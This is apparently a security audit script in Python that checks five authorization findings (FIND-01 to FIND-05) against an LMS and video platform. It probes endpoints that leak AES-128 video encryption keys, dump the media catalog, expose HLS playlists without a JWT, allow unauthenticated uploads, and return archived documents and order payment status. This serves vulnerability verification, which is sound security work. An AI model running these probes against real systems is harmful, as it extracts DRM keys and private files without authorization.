#!/usr/bin/env python3
"""
Automated Authorization Boundary & BOLA Auditor (FIND-01 through FIND-05).
Probes differential access controls across LMS, Shaka Transcoding API, and R2 Object Storage.
"""
from __future__ import annotations

import argparse
import json
from dataclasses import asdict, dataclass
from typing import Any

import requests


@dataclass
class AuditFindingResult:
    finding_id: str
    title: str
    vulnerable: bool
    http_status: int
    endpoint: str
    evidence_summary: dict[str, Any]


def run_bola_and_key_audit(base_url: str, timeout: int = 10) -> list[AuditFindingResult]:
    """
    Executes differential authorization checks against the target/lab base URL
    and returns structured verification results for FIND-01 through FIND-05.
    """
    base = base_url.rstrip("/")
    results: list[AuditFindingResult] = []
    sample_vid = "07297fe3-7b2b-42cc-86b8-749096b87c34"

    # 1. FIND-01A: Differential Check (/api/shaka/token vs /api/shaka/status/{id})
    r_tok = requests.get(f"{base}/api/shaka/token", params={"videoId": sample_vid}, timeout=timeout)
    r_stat = requests.get(f"{base}/api/shaka/status/{sample_vid}", timeout=timeout)
    stat_json = r_stat.json() if r_stat.status_code == 200 else {}
    leaks_key = "encryptionKey" in stat_json and "encryptionKeyId" in stat_json
    results.append(
        AuditFindingResult(
            finding_id="FIND-01A",
            title="Sibling Endpoint Key Leak (/api/shaka/status/{id} vs /api/shaka/token)",
            vulnerable=(r_tok.status_code == 401 and r_stat.status_code == 200 and leaks_key),
            http_status=r_stat.status_code,
            endpoint=f"{base}/api/shaka/status/{sample_vid}",
            evidence_summary={
                "token_endpoint_status": r_tok.status_code,
                "status_endpoint_status": r_stat.status_code,
                "leaked_encryption_key": stat_json.get("encryptionKey"),
                "leaked_iv_hex": stat_json.get("encryptionKeyId"),
            },
        )
    )

    # 2. FIND-01B: Upstream Media Catalog Dump (GET /api/media)
    r_media = requests.get(f"{base}/api/media", timeout=timeout)
    media_list = r_media.json() if r_media.status_code == 200 else []
    results.append(
        AuditFindingResult(
            finding_id="FIND-01B",
            title="Unauthenticated Mass Media Catalog & AES-128 Key Dump (GET /api/media)",
            vulnerable=(r_media.status_code == 200 and isinstance(media_list, list) and len(media_list) > 0),
            http_status=r_media.status_code,
            endpoint=f"{base}/api/media",
            evidence_summary={
                "total_videos_exposed": len(media_list) if isinstance(media_list, list) else 0,
                "first_video_id": media_list[0].get("id") if media_list else None,
            },
        )
    )

    # 3. FIND-02: Public R2 HLS Playlist & Encrypted Segment Access Without JWT
    r_m3u8 = requests.get(f"{base}/hls/{sample_vid}/video_1080p.m3u8", timeout=timeout)
    results.append(
        AuditFindingResult(
            finding_id="FIND-02",
            title="Direct Public Object Storage (R2) HLS Access Bypassing JWT Gateway",
            vulnerable=(r_m3u8.status_code == 200 and "#EXT-X-KEY:METHOD=AES-128" in r_m3u8.text),
            http_status=r_m3u8.status_code,
            endpoint=f"{base}/hls/{sample_vid}/video_1080p.m3u8",
            evidence_summary={
                "contains_ext_x_key": "#EXT-X-KEY:METHOD=AES-128" in r_m3u8.text,
                "playlist_lines": len(r_m3u8.text.splitlines()),
            },
        )
    )

    # 4. FIND-03: Unauthenticated Chunked Upload Pipeline Initialization
    r_up = requests.post(
        f"{base}/api/upload/init",
        json={"fileName": "audit-probe.mp4", "fileSize": 1024, "totalChunks": 1},
        timeout=timeout,
    )
    up_json = r_up.json() if r_up.status_code == 200 else {}
    results.append(
        AuditFindingResult(
            finding_id="FIND-03",
            title="Unauthenticated Chunked Video Upload Initialization (POST /api/upload/init)",
            vulnerable=(r_up.status_code == 200 and "uploadId" in up_json),
            http_status=r_up.status_code,
            endpoint=f"{base}/api/upload/init",
            evidence_summary=up_json,
        )
    )

    # 5. FIND-04: BOLA on Replaced/Historical Document Records
    archived_doc_id = "95c7c225-b691-4430-b964-322c4a127f29"
    r_doc = requests.get(f"{base}/api/documents/{archived_doc_id}/file", timeout=timeout)
    is_pdf = r_doc.status_code == 200 and r_doc.content.startswith(b"%PDF-")
    results.append(
        AuditFindingResult(
            finding_id="FIND-04",
            title="Broken Object Level Authorization (BOLA) on Replaced Document Stream",
            vulnerable=is_pdf,
            http_status=r_doc.status_code,
            endpoint=f"{base}/api/documents/{archived_doc_id}/file",
            evidence_summary={
                "pdf_magic_header": r_doc.content[:8].decode("ascii", errors="ignore"),
                "byte_length": len(r_doc.content),
            },
        )
    )

    # 6. FIND-05: Unauthenticated Order Payment Status Lookup with Seeded UUID
    seeded_order_id = "a0000000-0000-0000-0000-000000000001"
    r_ord = requests.get(f"{base}/api/book-orders/{seeded_order_id}/check-payment", timeout=timeout)
    ord_json = r_ord.json() if r_ord.status_code == 200 else {}
    results.append(
        AuditFindingResult(
            finding_id="FIND-05",
            title="Unauthenticated Order Payment Status Oracle & Seeded UUID Lookup",
            vulnerable=(r_ord.status_code == 200 and ord_json.get("paymentStatus") == "PAID"),
            http_status=r_ord.status_code,
            endpoint=f"{base}/api/book-orders/{seeded_order_id}/check-payment",
            evidence_summary=ord_json,
        )
    )

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="Run Automated BOLA & HLS DRM Key Auditor")
    parser.add_argument("--base-url", default="http://127.0.0.1:18080", help="Target or Lab Base URL")
    args = parser.parse_args()

    findings = run_bola_and_key_audit(args.base_url)
    print(json.dumps([asdict(f) for f in findings], indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
